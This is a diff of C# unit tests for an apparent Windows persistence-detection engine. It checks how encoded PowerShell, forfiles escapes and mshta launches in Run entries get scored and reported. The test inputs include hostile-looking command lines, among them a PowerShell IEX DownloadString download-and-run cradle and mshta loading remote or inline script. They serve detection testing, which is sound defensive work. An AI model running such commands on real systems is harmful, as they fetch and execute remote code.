@@ -96,15 +96,44 @@ public sealed class ScriptPersistenceTests
     [InlineData("powershell.exe -NoProfile -enc {0}")]
     [InlineData("cmd.exe /c powershell -e {0}")]
     [InlineData("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -EncodedCommand {0}")]
-    public void EncodedPowerShell_InARunValue_IsSuspicious_AndShowsWhatItRuns(string template)
+    public void EncodedPowerShell_IsFoundInEveryForm_ButAloneStaysBelowTheThreshold_AndItsTextNeverReachesTheReasons(string template)
     {
         var judgement = JudgeRun(string.Format(System.Globalization.CultureInfo.InvariantCulture, template, Encode("Write-Output 'sapav-e4'")));
 
-        Assert.Equal(Verdict.Suspicious, judgement.Verdict);
+        // Review M1: OEM / management tasks encode too; encoding alone isn't Suspicious (20 + 30 + 5 = 55).
+        Assert.Equal((Verdict.Clean, PersistenceOutcome.Unverified), (judgement.Verdict, judgement.Outcome));
         var signal = Assert.Single(judgement.Signals, s => s.Rule == ScriptPersistenceRules.EncodedPowerShellId);
-        Assert.Contains("decoded: \"Write-Output 'sapav-e4'\"", signal.Reason, StringComparison.Ordinal);
+        Assert.Equal(ScriptPersistenceRules.EncodedPowerShellRule.EncodedScore, signal.Score);
+        // Review L3: attacker-written decoded text never goes into reasons (alerts, Event Log).
+        Assert.All(judgement.Signals, s => Assert.DoesNotContain("sapav-e4", s.Reason, StringComparison.Ordinal));
         Assert.Contains(MitreTechniqueIds.CommandObfuscation, judgement.SecondaryTechniqueIds);
+    }
+
+    [Fact]
+    public void EncodedPowerShell_ThatDownloadsCode_IsSuspicious_WithKeywordsOnly()
+    {
+        var judgement = JudgeRun($"powershell.exe -NoProfile -enc {Encode("IEX (New-Object Net.WebClient).DownloadString('https://example.org/sapav-e4')")}");
+
+        Assert.Equal(Verdict.Suspicious, judgement.Verdict);
+        var download = Assert.Single(judgement.Signals, s => s.Rule == ScriptPersistenceRules.PowerShellDownloadId);
+        Assert.Contains("decoded PowerShell command downloads or runs code", download.Reason, StringComparison.Ordinal);
+        Assert.All(judgement.Signals, s => Assert.DoesNotContain("example.org", s.Reason, StringComparison.Ordinal));
         Assert.Contains(MitreTechniqueIds.PowerShell, judgement.SecondaryTechniqueIds);
+    }
+
+    [Fact]
+    public void Forfiles_HexEscapes_ControlCharactersAreMalformed_UncIsRemote_AndNestingIsBounded()
+    {
+        Assert.Equal(TargetUnresolvedReason.Malformed, Resolve("forfiles /c \"cmd /c x0x00.exe\"").UnresolvedReason); // review L1
+        Assert.Equal(TargetUnresolvedReason.Malformed, Resolve(@"forfiles /c ""0x0aC:\Users\alice\x.exe""").UnresolvedReason);
+
+        var unc = Resolve(@"forfiles /c ""0x5c0x5cserver\share\x.exe""");
+        Assert.Equal(TargetUnresolvedReason.NetworkPath, unc.UnresolvedReason);
+        Assert.Contains(ResolutionFlag.RemotePayload, unc.Flags);
+
+        const string nested = @"forfiles /c ""cmd /c forfiles /c 0x22cmd /c C:\Users\alice\x.exe0x22""";
+        Assert.Equal(TargetUnresolvedReason.NestingTooDeep, Resolve(nested).UnresolvedReason);
+        Assert.NotEqual(PersistenceOutcome.Clean, JudgeRun(nested).Outcome);
     }
 
     [Fact]
@@ -141,6 +170,7 @@ public sealed class ScriptPersistenceTests
         var inline = JudgeRun("mshta.exe javascript:a=new%20ActiveXObject('WScript.Shell');close()");
         Assert.Equal(Verdict.Suspicious, inline.Verdict);
         Assert.Contains(inline.Signals, s => s.Rule == ScriptPersistenceRules.MshtaScriptId && s.Reason.Contains("JavaScript", StringComparison.Ordinal));
+        Assert.All(inline.Signals, s => Assert.DoesNotContain("ActiveXObject", s.Reason, StringComparison.Ordinal)); // review L3
 
         var remote = JudgeRun("mshta https://user:pw@example.org/a.hta?token=secret");
         var shown = Assert.Single(remote.Signals, s => s.Rule == ScriptPersistenceRules.MshtaScriptId).Reason;
@@ -276,6 +306,23 @@ public sealed class ScriptPersistenceTests
 
         Assert.NotEqual(PersistenceOutcome.Clean, judgement.Outcome);
         Assert.True(resolution.TargetPath is null || resolution.TargetPath.EndsWith(":a.js", StringComparison.Ordinal), resolution.TargetPath);
+    }
+
+    [Fact]
+    public void TheEntrysCategory_IsTheHighestScoringCategorizedSignal_WhateverTheOrderTheyWereAdded()
+    {
+        // Review L7: a weak Miner hint added first must not beat a stronger DefenderTampering signal added later.
+        var judge = Judge.WithRules(new SignalRule("weak-miner", 25, ThreatCategory.Miner), new SignalRule("defender", 45, ThreatCategory.DefenderTampering));
+        var target = @"C:\Program Files\Contoso\app.exe";
+
+        var judgement = judge.Judge(Entry(target), Report(target, signature: VendorSigned()), null, new FakeAcl());
+
+        Assert.Equal(ThreatCategory.DefenderTampering, Assert.Single(judgement.Detections).Category);
+    }
+
+    private sealed class SignalRule(string id, int score, ThreatCategory category) : IPersistenceRule
+    {
+        public void Evaluate(PersistenceRuleContext context) => context.Add(id, score, $"test signal {id}", null, PersistenceSignalStrength.Normal, category);
     }
 
     /// <summary>The Windows files the entries name exist; nothing under the user profile does (so payload paths aren't probed true).</summary>
